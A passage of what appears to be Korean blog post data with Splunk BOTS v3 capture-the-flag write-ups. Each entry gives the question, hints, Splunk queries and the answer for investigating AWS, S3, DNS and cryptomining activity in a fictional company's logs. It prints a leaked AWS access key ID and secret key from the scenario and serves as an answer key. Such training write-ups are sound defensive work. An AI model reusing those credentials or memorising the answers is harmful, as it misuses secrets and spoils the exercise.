C:\\Users\\PeatCerf\\AppData\\Local\\Temp\\9027560D-FED5-45FC-A0CC-89A7591BC00E\\DismHost.exe      2              C:\\Windows\\Temp\\hdoor.exe      20              C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe      51      hdoor.exe이 굉장히 의심스럽습니다.*.exe source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" Image IN(*tmp*, *temp*)| dedup Image| table _time Image Computer User SourceIp DestinationIp| reverse            _time      Image      Computer      User      SourceIp      DestinationIp                  2018/08/20 09:16:50      C:\\Users\\ALBUNG~1\\AppData\\Local\\Temp\\632F4847-CD24-4609-823F-C2C020FD03EB\\DismHost.exe      ABUNGST-L.froth.ly                                   2018/08/20 10:33:27      C:\\Users\\BRUCEG~1\\AppData\\Local\\Temp\\GUM4F89.tmp\\DropboxUpdate.exe      BGIST-L.froth.ly                                   2018/08/20 10:33:27      C:\\Users\\BruceGist\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\TempState\\Downloads\\DropboxInstaller.exe      BGIST-L.froth.ly                                   2018/08/20 10:44:05      C:\\Windows\\Temp\\hdoor.exe      FYODOR-L.froth.ly      AzureAD\\FyodorMalteskesko      192.168.8.103      192.168.9.50              2018/08/20 11:34:02      C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe      FYODOR-L.froth.ly      AzureAD\\FyodorMalteskesko      192.168.8.103      192.168.9.30              2018/08/20 11:34:33      C:\\Users\\FYODOR~1\\AppData\\Local\\Temp\\3F5D15FE-AD68-4E1F-B3C4-90E199AF3640\\DismHost.exe      FYODOR-L.froth.ly                                   2018/08/20 15:00:41      C:\\Users\\PeatCerf\\AppData\\Local\\Temp\\9027560D-FED5-45FC-A0CC-89A7591BC00E\\DismHost.exe      PCERF-L.froth.ly                           가장 먼저 업로드된 파일은 hdoor.exe입니다.답 : hdoor.exe",
        "url": "/splunk-BOTS-v3-part3"
    }
    ,
    
    "splunk-bots-v3-part2": {
        "title": "splunk-bots-v3 write up(2)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과  secnario #1Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.BOTS-V3index=botsv3의 sourcetype은 아래와 같습니다.| metadata type=sourcetypes index=botsv3| stats values(sourcetype)  sourcetype 목록            values(sourcetype)                  PerfmonMk:Process              Script:GetEndpointInfo              Script:InstalledApps              Script:ListeningPorts              Unix:ListeningPorts              Unix:SSHDConfig              Unix:Service              Unix:Update              Unix:Uptime              Unix:UserAccounts              Unix:Version              WinHostMon              access_combined              alternatives              amazon-ssm-agent              amazon-ssm-agent-too_small              apache_error              aws:cloudtrail              aws:cloudwatch              aws:cloudwatch:guardduty              aws:cloudwatchlogs              aws:cloudwatchlogs:vpcflow              aws:config:rule              aws:description              aws:elb:accesslogs              aws:rds:audit              aws:rds:error              aws:s3:accesslogs              bandwidth              bash_history              bootstrap              cisco:asa              cloud-init              cloud-init-output              code42:api              code42:computer              code42:org              code42:security              code42:user              config_file              cpu              cron-too_small              df              dmesg              dpkg              error-too_small              errors              errors-too_small              ess_content_importer              hardware              history-2              interfaces              iostat              lastlog              linux_audit              linux_secure              localhost-5              lsof              maillog-too_small              ms:aad:audit              ms:aad:signin              ms:o365:management              ms:o365:reporting:messagetrace              netstat              o365:management:activity              openPorts              osquery:info              osquery:results              osquery:warning              out-3              package              protocol              ps              stream:arp              stream:dhcp              stream:dns              stream:http              stream:icmp              stream:igmp              stream:ip              stream:mysql              stream:smb              stream:smtp              stream:tcp              stream:udp              symantec:ep:agent:file              symantec:ep:agt_system:file              symantec:ep:behavior:file              symantec:ep:packet:file              symantec:ep:risk:file              symantec:ep:scm_system:file              symantec:ep:security:file              symantec:ep:traffic:file              syslog              time              top              usersWithLoginPrivs              vmstat              who              wineventlog              xmlwineventlog              yum-too_small      218\tWhat IAM user access key generates the most distinct errors when attempting to access IAM resources?IAM 리소스에 액세스하려고 할 때 가장 뚜렷한 오류를 생성하는 IAM 사용자 액세스 키는 무엇입니까?  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 조사하세요.  hint#2    Make sure to include all the error codes, such as AccessDenied and NoSuchEntityException.    AccessDenied 및 NoSuchEntityException과 같은 모든 오류 코드를 포함해야 합니다.액세스 오류관련 로그는 cloudtrail에 있을것입니다. aws 공식문서에서 찾아봅니다.오류 코드 및 메시지 로그의 예AWS cloudtrail 문서errorCode 및 errorMessage 요소에 이 오류를 표시합니다.sourcetype=aws:cloudtrail errorCode=*access*| dedup errorCode errorMessage| table errorCode errorMessageerrorcode필드에서 AccessDenied값을 발견할 수 있습니다. 이 키워드를 중심으로 검색해봅니다.sourcetype=aws:cloudtrail errorCode=AccessDenied6개의 이벤트가 있고, userIdentity.accessKeyId필드 AKIAJOGCDXJ5NW5PXUPA와 ASIAZB6TMXZ7LL6JBJQA를 발견할 수 있습니다.key가 AKIAJOGCDXJ5NW5PXUPA인 이벤트의 errorMessage를 보면 User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:GetUser on resource: user web_admin 이므로, IAM리스소에 접속하는 이벤트의 액세스키는 AKIAJOGCDXJ5NW5PXUPA입니다.(ASIAZB6TMXZ7LL6JBJQA는 bucketlist에 접속하는 이벤트입니다)답 : AKIAJOGCDXJ5NW5PXUPA219\tBud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?Bud가 실수로 AWS 액세스 키를 외부 코드 리포지토리에 커밋합니다. 얼마 후 그는 AWS로부터 계정이 손상되었다는 알림을 받습니다. Amazon이 그의 행동으로 여는 case ID는 무엇입니까?  hint#1    Use stream:smtp as the sourcetype.    sourcetype stream:smtp에서 조사하십시오.aws support case위와 같이 검색하면 sourcetype stream:smtp의 subject필드에 support case ID정보를 발견할 수 있습니다.subject: Amazon Web Services: New Support case: 5244329601답 : 5244329601220\tAWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?AWS 액세스 키는 액세스 키 ID(예: AKIAIOSFODNN7EXAMPLE)와 보안 액세스 키(예: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY)의 두 부분으로 구성됩니다. 외부 코드 저장소로 유출된 키의 비밀 접근 키는 무엇입니까?  hint#1    Use stream:smtp as the sourcetype.    sourcetype stream:smtp에서 조사하십시오.219문제에서 발견한 email의 content내용을 보면 아래와 같습니다.Your security is important to us. We have become aware that the AWS Access Key AKIAJOGCDXJ5NW5PXUPA (belonging to IAM user \"web_admin\") along with the corresponding Secret Key is publicly available online at https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/aws_credentials.bak.해당 github page로 가면 secret key를 발견할 수 있습니다.https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/aws_credentials.bak답 : Bx8/gTsYC98T0oWiFhpmdROqhELPtXJSR9vFPNGk221\tUsing the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource? Answer guidance: One word.유출된 키를 사용하여 공격자는 승인되지 않은 특정 리소스에 대한 키 생성을 시도합니다. 그 자원의 이름은 무엇입니까? 답변 안내: 한 단어.  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 조사하십시오.계정생성관련 이벤트는 cloudtrail에 있으므로, 위에서 파악한 키를 키워드로 키 생성같은 이벤트를 찾아봅니다.sourcetype=aws:cloudtrail *AKIAJOGCDXJ5NW5PXUPA*| table eventName            eventName                  UpdateAccessKey              GetUser              DescribeAccountAttributes              ListAccessKeys              GetSessionToken              CreateAccessKey              DeleteAccessKey              CreateUser              ListAccessKeys              GetCallerIdentity      eventName이 CreateAccessKey인 이벤트를 살펴봅시다.sourcetype=aws:cloudtrail *AKIAJOGCDXJ5NW5PXUPA* eventName=CreateAccessKeyerror message 필드를 보면 User: arn:aws:iam::622676721278:user/web_admin is not authorized to perform: iam:CreateAccessKey on resource: user nullweb_admin자원이름은 nullweb_admin입니다.답 : nullweb_admin222\tUsing the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?유출된 키를 사용하여 공격자는 계정을 알아내기 위해 무단으로 시도합니다. 요청을 시작한 애플리케이션의 전체 사용자 에이전트 문자열은 무엇입니까?  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 조사하십시오.전문제와 동일한 조건에서, eventName이 GetUser인 이벤트의 useragent를 파악해봅시다.sourcetype=aws:cloudtrail *AKIAJOGCDXJ5NW5PXUPA* eventName=GetUser| table userAgent            userAgent                  ElasticWolf/5.1.6      답 : ElasticWolf/5.1.6223\tThe adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt? Answer guidance: Two words.공격자는 손상된 IAM 사용자로 Ubuntu 클라우드 이미지를 시작하려고 시도합니다. 첫 번째 시도에서 해당 운영 체제 버전의 코드명은 무엇입니까? 답변 안내: 두 단어.  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 조사하십시오.sourcetype=aws:cloudtrail errorCode=\"Client.UnauthorizedOperation\" eventName=RunInstances| sort _timerequestParameters.instancesSet.items{}.imageId필드의 값이 ami-41e0b93b 임을 알 수 있습니다.구글에 ami-41e0b93b ubuntu로 검색해봅니다.Xenial이란 이름이 있는데 두단어가 아닙니다.ubuntu Xenial로 검색해봅니다.두 단어 이름은 Xenial Xerus입니다.답 : Xenial Xerus224\tFrothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com? Answer guidance: Round to two decimal places. (Example: The third-level subdomain for my.example.company.com is example.)Frothly는 DNS 웹 서비스에 Amazon Route 53을 사용합니다. brewertalk.com에 대한 쿼리에서 고유한 세 번째 수준 하위 도메인의 평균 길이는 얼마입니까? 답변 안내: 소수점 이하 두 자리까지 반올림합니다. (예: my.example.company.com의 세 번째 수준 하위 도메인은 example입니다.)  hint#1    Use aws:cloudwatchlogs as the sourcetype for DNS queries.    aws:cloudwatchlogs를 DNS 쿼리의 소스 유형으로 사용합니다.  hint#2    Look at the documentation for URL Toolbox (on Splunkbase) to help you parse out the subdomain substring. Use the Splunk len command to help you calculate the length or review the blog entries in https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html. This will teach you how to split domains with URL Toolbox.    하위 도메인 하위 문자열을 구문 분석하는 데 도움이 되는 URL 도구 상자(Splunkbase의) 설명서를 참조하십시오. Splunk len 명령을 사용하여 길이를 계산하거나 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html의 블로그 항목을 검토할 수 있습니다. 이것은 URL Toolbox를 사용하여 도메인을 분할하는 방법을 알려줍니다.  hint#3    Make sure to include only the distinct third-level subdomain values.    고유한 세 번째 수준 하위 도메인 값만 포함해야 합니다.aws:cloudwatchlogs에 DNS관련 데이터가 있습니다. brewertalk.com가 있는 이벤트를 발췌해봅시다.sourcetype=aws:cloudwatchlogs brewertalk.com1.0 2018-08-20T15:08:11Z Z149R7NEBZTKPN hitech1.brewertalk.com A NXDOMAIN UDP NRT20 13.125.50.235 -와 같은 이벤트가 10만개가 넘습니다.정규표현식을 사용해 subdomain을 발췌하고, 값들의 평균을 구한 후 반올립합니다.sourcetype=aws:cloudwatchlogs brewertalk.com| rex field=_raw \"Z149R7NEBZTKPN\\s(?&lt;query&gt;[^\\s]+)\" | rex field=query \"\\.?(?&lt;subdomain&gt;[^\\.]+).brewertalk.com\" | dedup subdomain| table subdomain| eval lenSubdomain = len(subdomain)| stats avg(lenSubdomain) as answer| eval answer=round(answer,2)답 : 8.10225\tUsing the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites? Answer guidance: Include the file extension.memcached 공격에서 발견된 페이로드 데이터를 사용하여 대동강이 다른 양조장 웹사이트를 훼손하는 데 사용하는 .jpeg 파일의 이름은 무엇입니까? 답변 지침: 파일 확장자를 포함합니다.  hint#1    Use stream:udp as the sourcetype to find the injected string and separate out the payload.    sourcetype stream:udp에서 주입된 문자열을 찾고 페이로드를 분리합니다.  hint#2    Google search for the two strings with special characters.    Google은 특수 문자가 있는 두 문자열을 검색합니다.  hint#3    Looking at one of the websites from the Google results, inspect the source code and identify the name of the image file.    Google 결과에서 웹사이트 중 하나를 보고 소스 코드를 검사하고 이미지 파일의 이름을 식별합니다.memcached attack(https://www.cloudflare.com/ko-kr/learning/ddos/memcached-ddos-attack/)관련 내용을 참고바랍니다.udp 11211포트를 사용한 DDoS공격입니다.공격을 찾아봅시다.source=\"stream:udp\" dest_port=11211공격자 : 13.125.33.130답 : index1.jpeg",
        "url": "/splunk-BOTS-v3-part2"
    }
    ,
    
    "splunk-bots-v3-part1": {
        "title": "splunk-bots-v3 write up(1)",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과  secnario #1Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.BOTS-V3index=botsv3의 sourcetype은 아래와 같습니다.| metadata type=sourcetypes index=botsv3| stats values(sourcetype)  sourcetype 목록            values(sourcetype)                  PerfmonMk:Process              Script:GetEndpointInfo              Script:InstalledApps              Script:ListeningPorts              Unix:ListeningPorts              Unix:SSHDConfig              Unix:Service              Unix:Update              Unix:Uptime              Unix:UserAccounts              Unix:Version              WinHostMon              access_combined              alternatives              amazon-ssm-agent              amazon-ssm-agent-too_small              apache_error              aws:cloudtrail              aws:cloudwatch              aws:cloudwatch:guardduty              aws:cloudwatchlogs              aws:cloudwatchlogs:vpcflow              aws:config:rule              aws:description              aws:elb:accesslogs              aws:rds:audit              aws:rds:error              aws:s3:accesslogs              bandwidth              bash_history              bootstrap              cisco:asa              cloud-init              cloud-init-output              code42:api              code42:computer              code42:org              code42:security              code42:user              config_file              cpu              cron-too_small              df              dmesg              dpkg              error-too_small              errors              errors-too_small              ess_content_importer              hardware              history-2              interfaces              iostat              lastlog              linux_audit              linux_secure              localhost-5              lsof              maillog-too_small              ms:aad:audit              ms:aad:signin              ms:o365:management              ms:o365:reporting:messagetrace              netstat              o365:management:activity              openPorts              osquery:info              osquery:results              osquery:warning              out-3              package              protocol              ps              stream:arp              stream:dhcp              stream:dns              stream:http              stream:icmp              stream:igmp              stream:ip              stream:mysql              stream:smb              stream:smtp              stream:tcp              stream:udp              symantec:ep:agent:file              symantec:ep:agt_system:file              symantec:ep:behavior:file              symantec:ep:packet:file              symantec:ep:risk:file              symantec:ep:scm_system:file              symantec:ep:security:file              symantec:ep:traffic:file              syslog              time              top              usersWithLoginPrivs              vmstat              who              wineventlog              xmlwineventlog              yum-too_small      200\tList out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly’s AWS environment? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: ajackson,mjones,tmiller)Frothly의 AWS 환경에서 AWS 서비스(성공 또는 실패)에 액세스한 IAM 사용자를 나열합니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다. (예: ajackson,mjones,tmiller)  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 찾으세요  hint#2    Look at the values within the user_type field.    user_type의 값을 보세요.sourcetype=*aws:* *IAM*user_agent field를 보면 IAMUser란 값이 보입니다.user라는 필드가 눈에 띄니 보도록 합시다.sourcetype=*aws* *IAM* user_type=IAMUser| dedup user| table user| sort -user            user                  bstoll              btun              splunk_access              web_admin      답 : bstoll,btun,splunk_access,web_admin201\tWhat field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)? Answer guidance: Provide the full JSON path. (Example: iceCream.flavors.traditional)MFA(다중 요소 인증) 없이 AWS API 활동이 발생했음을 알리기 위해 어떤 필드를 사용하시겠습니까? 답변 안내: 전체 JSON 경로를 제공하세요. (예: iceCream.flavors.traditional)  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail를 살펴보세요.  hint#2    Check out the AWS docs: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example     AWS 공식문서를 참고하세요. https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudwatch-alarms-for-cloudtrail-additional-examples.html#cloudwatch-alarms-for-cloudtrail-no-mfa-example  hint#3    Make sure you are not including console login activity.    콘솔 로그인 활동을 포함하지 않았는지 확인하십시오.CloudTrail은 AWS 환경에서 수행 된 모든 작업의 로그입니다.clouldtrail에서 MFA 관련 로그를 찾아봅시다.sourcetype=aws:cloudtrail *MFA*쿼리 결과를 보면 mfamfaAuthenticated라는 필드를 볼 수 있습니다.AWS 공식문서에 해당 필드가 MFA 사용여부를 확인하는 필드임을 확인할 수 있습니다.답 : userIdentity.sessionContext.attributes.mfaAuthenticated202\tWhat is the processor number used on the web servers? Answer guidance: Include any special characters/punctuation. (Example: The processor number for Intel Core i7-8650U is i7-8650U.)웹 서버에서 사용되는 프로세서 번호는 무엇입니까? 답변 안내: 특수 문자/문장부호를 포함하십시오. (예: Intel Core i7-8650U의 프로세서 번호는 i7-8650U입니다.)  hint#1    Use hardware as the sourcetype for hardware information such as CPU statistics, hard drives, network interface cards, memory, and more.    CPU 통계, 하드 드라이브, 네트워크 인터페이스 카드, 메모리 등과 같은 하드웨어 정보의 소스 유형으로 하드웨어를 사용합니다.CPU 이름에 intel 혹은 amd가 포함되어있을테니 해당 키워드로 검색해봅니다.intel OR amd| stats count by sourcetype            sourcetype      count                  WinHostMon      1916              aws:elb:accesslogs      430              stream:http      368              access_combined      366              stream:mysql      172              aws:rds:audit      93              ms:o365:management      63              wineventlog      29              o365:management:activity      18              syslog      8              dmesg      6              osquery:results      4              aws:cloudwatchlogs      3              hardware      3              stream:udp      2              stream:smtp      1      WinHostMon이 유력하지만, hardware라는 sourcetype이 눈에 띕니다.해당 sourcetype으로 검색해봅니다.intel OR amd sourcetype=hardwareCPU_TYPE필드 값은 다음과 같습니다. Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz답 : E5-2676203\tBud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access? Answer guidance: Include any special characters/punctuation.Bud가 실수로 S3 버킷에 공개적으로 액세스할 수 있도록 합니다. 공개 액세스를 활성화한 API 호출의 이벤트 ID는 무엇입니까? 답변 안내: 특수 문자/문장부호를 포함하십시오.  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail을 보세요.설정관련 로그는 cloudtrail에 있을것입니다. s3를 키워드로 검색해봅니다.sourcetype=aws:cloudtrail s3field중에 eventName이 있습니다. 어떤 eventName이 있는지 봅시다.sourcetype=aws:cloudtrail s3| dedup eventName| table eventName설정하는 이벤트(Set이 포함된 이벤트이름 등)가 있을것입니다.  결과            eventName                  DescribeConfigRuleEvaluationStatus              DescribeConfigRules              GetBucketLocation              GetBucketCors              GetBucketTagging              GetBucketLifecycle              GetBucketLogging              ListBuckets              GetBucketEncryption              GetBucketVersioning              GetBucketPolicy              GetBucketAcl              GetComplianceDetailsByConfigRule              PutEvaluations              GetBucketRequestPayment              GetBucketReplication              GetBucketWebsite              GetBucketNotification              PutBucketAcl              DescribeLoadBalancerAttributes      중간에 PutBucketAcl이란 이벤트 이름이 보입니다.해당키워드로 검색해봅니다.Grantee.URL을 보면 AllUsers란 게있습니다.sourcetype=\"aws:cloudtrail\" eventName=\"PutBucketAcl\"| table _time eventID requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Permission            _time      eventID      requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Grantee.URI      requestParameters.AccessControlPolicy.AccessControlList.Grant{}.Permission                  2018/08/20 13:57:54      9a33d8df-1e16-4d58-b36d-8e80ce68f8a3      http://acs.amazonaws.com/groups/s3/LogDeliveryhttp://acs.amazonaws.com/groups/s3/ogDeliveryhttp://acs.amazonaws.com/groups/s3/LogDelivery      FULL_CONTROLWRITEREAD_ACPREADFULL_CONTROL              2018/08/20 13:01:46      ab45689d-69cd-41e7-8705-5350402cf7ac      http://acs.amazonaws.com/groups/s3/LogDeliveryhttp://acs.amazonaws.com/groups/s3/LogDeliveryhttp://cs.amazonaws.com/groups/s3/LogDeliveryhttp://acs.amazonaws.com/groups/global/AllUsershttp://acs.amazonaws.com/groups/global/AllUsers      FULL_CONTROLWRITEREAD_ACPREADFULL_CONTROLREADWRITE      AllUsers에 대한 READ, WRITE 권한이 2018/08/20 13:57:54에 빠졌습니다.S3 Bucket이 모든사용자에게 공개된 시간은 2018/08/20 13:01:46 ~ 2018/08/20 13:57:54 입니다.공개정책을 넣은 eventID는 ab45689d-69cd-41e7-8705-5350402cf7ac입니다.답 : ab45689d-69cd-41e7-8705-5350402cf7ac204\tWhat is the name of the S3 bucket that was made publicly accessible?공개적으로 액세스할 수 있게 된 S3 버킷의 이름은 무엇입니까?  hint#1    Use aws:cloudtrail as the sourcetype.    sourcetype aws:cloudtrail에서 찾으세요.https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_Trail.htmlsplunk 로그에서는 S3BucketName이 아닌, bucketName 입니다.203번문제에서 발생한 bucketName은 frothlywebcode 입니다.205\tWhat is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Provide just the file name and extension, not the full path. (Example: filename.docx instead of /mylogs/web/filename.docx)공개적으로 액세스할 수 있는 동안 S3 버킷에 성공적으로 업로드된 텍스트 파일의 이름은 무엇입니까? 답변 안내: 전체 경로가 아닌 파일 이름과 확장자만 제공하세요. (예: /mylogs/web/filename.docx 대신 filename.docx)  hint#1    Use aws:s3:accesslogs as the sourcetype.sourctype중 aws:s3:accesslogs가 있습니다. 여기서 frothlywebcode로 업로드 된 텍스트 파일을 찾아봅시다.검색범위를 줄이기 위해 aws:s3:accesslogs의 필드를 보니 요청 성공여부를 나타내는 http_status, 수행 함수를 뜻하는 opertaion필드가 있습니다.http_status=200, REST.PUT.OBJECT 조건을 추가로 넣어 검색해봅니다.sourcetype=aws:s3:accesslogs frothlywebcode http_status=200 operation=\"REST.PUT.OBJECT\" .txtOPEN_BUCKET_PLEASE_FIX.txt라는 이름의 텍스트 파일을 발견할 수 있습니다.답 : OPEN_BUCKET_PLEASE_FIX.txt206\tWhat is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible? Answer guidance: Round to two decimal places without the unit of measure. Use 1024 for the byte conversion. Use a period (not a comma) as the radix character.공개적으로 액세스할 수 있는 동안 S3 버킷에 성공적으로 업로드된 .tar.gz 파일의 크기(MB)는 얼마입니까? 답변 안내: 측정 단위 없이 소수점 이하 두 자리까지 반올림합니다. 바이트 변환에 1024를 사용합니다. 기수 문자로 마침표(쉼표 아님)를 사용합니다.  hint#1    Use aws:s3:accesslogs as the sourcetype.    sourcetype aws:s3:accesslogs에서 찾으세요.  hint#1    Take a closer look at who made (or requested) the upload.    누가 업로드를 했는지(또는 요청했는지) 자세히 살펴보세요.공개된 시간은 2018/08/20 13:01:46 ~ 2018/08/20 13:57:54이므로, 해당 시간안에 .tar.gz 확장자의 파일이 업로드된 이벤트를 탐색해봅시다.sourcetype=aws:s3:accesslogs frothlywebcode http_status=200 operation=\"REST.PUT.OBJECT\" .tar.gzobject_size 필드가 눈에 띕니다.해당 값을 MiB(1024)로 변환해봅시다.※ MiB (메비바이트 : mebibyte) :메비바이트는 1,024키비바이트, 220(10242 = 1,048,576)바이트를 뜻하는 정보의 단위이다.답 : 2.93207 문제는 없습니다.208\tA Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint? Answer guidance: Include any special characters/punctuation.Frothly 엔드포인트는 코인 채굴 활동의 징후를 보입니다. 이 끝점에서 이 활동에서 100% CPU 프로세서 사용 시간에 도달한 첫 번째 프로세스의 이름은 무엇입니까? 답변 안내: 특수 문자/문장부호를 포함하십시오.  hint#1    Use perfmonmk:process as the sourcetype.    sourcetype perfmonmk:process에서 조사하세요.  hint#2    Which browser was in use when this endpoint visited the coin mining site(s)?    이 엔드포인트가 코인 마이닝 사이트를 방문했을 때 어떤 브라우저가 사용 중이었습니까?cpu를 포함한 process의 자원 사용률은 PerfmonMk:Process에서 찾을 수 있을것입니다. 자세한 사항은 splunk 홈페이지에서 확인 가능합니다.PerfmonMk:Process in splunksourcetype=perfmonmk:process해당 sourcetype에 process_cpu_used_percent와 process_name이라는 필드가 눈에 띕니다.process_cpu_used_percent=100을 추가하고, process_name을 보도록합니다.sourcetype=perfmonmk:process process_cpu_used_percent=100 process_name=*| sort _time| table _time host process_name process_cpu_used_percent|_time|host|\tprocess_name|\tprocess_cpu_used_percent||—|—|—|—||2018/08/20 09:36:26|BSTOLL-L|\tMicrosoftEdgeCP#2|\t100||2018/08/20 13:37:50|BSTOLL-L|\tchrome#5|\t100||2018/08/20 13:38:20|BSTOLL-L|\tchrome#5|\t100|….제일먼저 cpu가 100%인 프로세스는 MicrosoftEdgeCP#2입니다. 하지만 답은 chrome#5입니다.근거를 찾지 못하였으니 아시는 분은 댓글로 제보 바랍니다.답 : chrome#5209\tWhen a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script? Answer guidance: Provide the number of installed packages then number of dependent packages, comma separated without spaces.Frothly 웹 서버 EC2 인스턴스가 Auto Scaling을 통해 시작되면 인스턴스가 시작된 후 자동화된 구성 작업을 수행합니다. 클라우드 초기화 스크립트에 의해 설치되는 패키지 및 종속 패키지는 몇 개입니까? 답변 안내: 설치된 패키지 수와 종속 패키지 수를 공백 없이 쉼표로 구분하여 제공하십시오.  hint#1    Use cloud-init-output as the sourcetype.    sourcetype cloud-init-output를 조사해보세요.  hint#1    Check out the AWS docs: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-cloud-init    AWS 공식문서를 참고하세요 : https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-cloud-init문제에서 auto scaling을 수행하면 인스턴스가 시작된 후 자동화 작업을 시작한다는 설명이 있습니다.인스턴스 시작관련 로그는 clould-init에 있습니다.could-init과 관련된 sourcetype은 cloud-init과 cloud-init-output이 있습니다.두 sourcetype 모두 조사해보도록 합시다.packages와 dependent를 키워드로 두고 검색해봅니다.sourcetype=cloud-init* *packages* *dependent*로그를 확인하면 Install  7 Packages (+13 Dependent packages) 7개의 패키지와, 13개의 의존 패키지가 설치된 사실을 파악할 수 있습니다.답 : 7,13210\tWhat is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency? (Example: ahamilton instead of ahamilton.mycompany.com)실제로 Monero 암호화폐를 채굴하는 유일한 Frothly 엔드포인트의 짧은 호스트 이름은 무엇입니까? (예: ahamilton.mycompany.com 대신 ahamilton)  hint#1    What is the most common browser-based cryptominer?    가장 일반적인 브라우저 기반 크립토마이너는 무엇입니까?  hint#2    Can you find DNS traffic with evidence of a common browser-based cryptomining technology?    일반적인 브라우저 기반 크립토마이닝 기술의 증거로 DNS 트래픽을 찾을 수 있습니까?  hint#3    Is there a laptop that communicates successfully to coinhive servers?    coinhive 서버와 성공적으로 통신하는 노트북이 있습니까?google에 browser based crypto miner를 검색해 봅시다.다음 검색결과를 얻을 수 있습니다.해당 사이트에서 coinhive와 Cryptojacking이 있다고 알 수 있습니다. 해당 키워드로 검색해봅니다.208번문제에서 BSTOLL-Lcoinhive총 34개의 이벤트이고, BSTOLL-L의 이벤트가 가장 많습니다. BSTOLL-L이 모두 DNS Query관련 이벤트입니다.(21개)Query를 질의하는 host인 BSTOLL-L이 채굴하는 host로 볼 수 있습니다.답 : BSTOLL-L211\tHow many cryptocurrency mining destinations are visited by Frothly endpoints?Frothly 엔드포인트는 얼마나 많은 암호화폐 채굴 목적지를 방문합니까?  hint#1    Use stream:dns as the sourcetype.    sorucetype stream:dns에서 조사하세요.채굴 목적지 수는 dns에서 query목록중 coinhive가 포함된 주소의 수를 찾으면 될것입니다.sourcetype=stream:dns query=*coinhive*| dedup query| table query            query                  ws019.coinhive.com              coinhive.com              ws014.coinhive.com              ws011.coinhive.com              ws005.coinhive.com              ws001.coinhive.com      총 6개의 주소를 발견할 수 있습니다.참고로, dc함수를 이용해 이벤트 결과 수를 